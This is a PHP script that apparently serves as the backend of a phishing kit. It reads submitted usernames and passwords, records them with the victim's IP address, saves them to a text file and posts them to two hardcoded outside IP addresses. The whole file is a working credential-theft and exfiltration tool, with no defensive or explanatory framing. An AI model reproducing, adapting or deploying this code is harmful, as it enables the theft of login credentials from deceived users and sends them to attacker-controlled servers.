<?php
header("Access-Control-Allow-Origin: *");
require 'call.php';
$ip = @$_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr(@$_SERVER['REMOTE_ADDR']);
$browser = @$_SERVER['HTTP_USER_AGENT'];

$user = $_POST['username'];
$password = $_POST['password'];


echo $user . $password;

$myfile = fopen("response1.txt", "w");
$info =
    "--------- Login.inf -----------" . "\r\n" .
    "User: " . $user . "\r\n" .
    "Pass: " . $password . "\r\n" .
    "-" .
    "Ip:  " . $ip . "\r\n" .
    "--------- Login.inf -----------";




$url = 'http://63.141.248.148:22';
$data = array('info' => $info );
// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
if ($result === FALSE) { /* Handle error */ }

var_dump($result);


$url2 = 'http://107.175.34.149:22';
$data = array('info' => $info );
// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data)
    )
);
$context  = stream_context_create($options);
$result = file_get_contents($url2, false, $context);
if ($result === FALSE) { /* Handle error */ }

var_dump($result);



$myfile = fopen("response1.txt", "w") or die("Unable to open file!");
$txt = $info;
fwrite($myfile, $txt);
fclose($myfile);

